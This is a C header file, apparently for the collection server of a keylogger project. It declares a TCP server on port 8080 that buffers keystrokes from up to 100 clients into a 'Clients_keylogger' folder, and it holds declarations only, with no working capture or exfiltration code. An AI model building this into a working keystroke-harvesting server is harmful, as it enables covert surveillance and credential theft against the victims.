#ifndef SERVER_h
#define SERVER_h
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <sys/stat.h>
#include <sys/types.h>

#define SERVER_PORT 8080
#define BUFFER_SIZE 128
#define SERVER_MAX_CLIENTS 100
#define SERVER_FOLDER_PATH "../Clients_keylogger"
#define SERVER_INIT_KEYS 0
#define SERVER_MAX_FILE_NAME_LENGTH 256
#define SERVER_MAX_KEYS_BUFFER 10000
#define SERVER_STARTING_CLIENTS_COUNT 0

typedef struct client {
    int socket_fd;
    int keys;
    char *buffer_array;
} client_t;

typedef struct server_data {
    client_t *clients_arr[SERVER_MAX_CLIENTS];
} server_t;

typedef struct args {
    client_t *client;
} args_t;


pthread_mutex_t mutex_array_lock, mutex_server_data_lock;
int clients_connected;
server_t *server;

void handle_client_buffer(int socket_fd, client_t *client);

int add_char_to_buffer(client_t *client, char chr);

void *pthread_handle_connection(void *args);

#endif //SERVER_H

